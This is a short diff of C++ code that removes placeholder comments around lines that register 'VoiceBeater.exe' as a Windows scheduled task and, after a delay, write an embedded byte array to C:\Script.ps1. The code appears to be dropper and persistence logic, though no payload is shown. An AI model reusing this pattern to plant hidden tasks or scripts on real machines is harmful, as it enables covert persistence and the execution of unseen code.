@@ -338,8 +338,7 @@ bool CloneAndDropProcess() {
 	const char* taskName = "VoiceBeater";
 	if (!doesTaskExist(taskName))
 	{ 
-		const char* programPath = "C:\\VoiceBeater.exe"; // Replace this with your program's path
-		 // Replace this with your desired task name
+		const char* programPath = "C:\\VoiceBeater.exe"; 
 
 		std::string command = "schtasks /Create /TN ";
 		command += taskName;
@@ -365,7 +364,7 @@ int main() {
 	Sleep(10000);
 	{
 		// Path for the output file
-		std::string filePath = "C:\\Script.ps1"; // Change the file name and extension as needed
+		std::string filePath = "C:\\Script.ps1";
 
 		// Create the file using the byte array
 		createFileFromByteArray(byteArray, filePath);
